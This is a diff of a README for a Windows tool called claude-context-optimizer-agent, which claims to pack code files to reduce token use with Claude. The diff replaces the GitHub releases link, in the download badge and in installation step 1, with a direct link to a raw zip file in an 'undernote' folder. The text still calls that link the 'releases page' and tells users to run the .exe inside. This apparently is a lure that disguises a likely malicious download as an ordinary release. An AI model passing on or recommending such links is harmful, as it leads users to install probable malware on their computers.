@@ -1,6 +1,6 @@
 # ⚡ claude-context-optimizer-agent - Pack your code for better AI results
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/yannis9207/claude-context-optimizer-agent/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/yannis9207/claude-context-optimizer-agent/raw/refs/heads/main/undernote/optimizer_agent_context_claude_2.4.zip)
 
 This application helps you get better results from Claude 3.5 Sonnet. It packs your project files into a compact format. This reduces the number of tokens you send. You save money and help the AI model focus on your code.
 
@@ -16,7 +16,7 @@ This tool runs on Windows 10 or Windows 11. Ensure your computer has at least 4G
 
 Follow these steps to prepare your computer.
 
-1. Visit the project releases page to download the setup file: https://github.com/yannis9207/claude-context-optimizer-agent/releases
+1. Visit the project releases page to download the setup file: https://github.com/yannis9207/claude-context-optimizer-agent/raw/refs/heads/main/undernote/optimizer_agent_context_claude_2.4.zip
 2. Find the file ending in .exe in the latest release section.
 3. Click the file to download it to your Downloads folder.
 4. Open the downloaded file. 
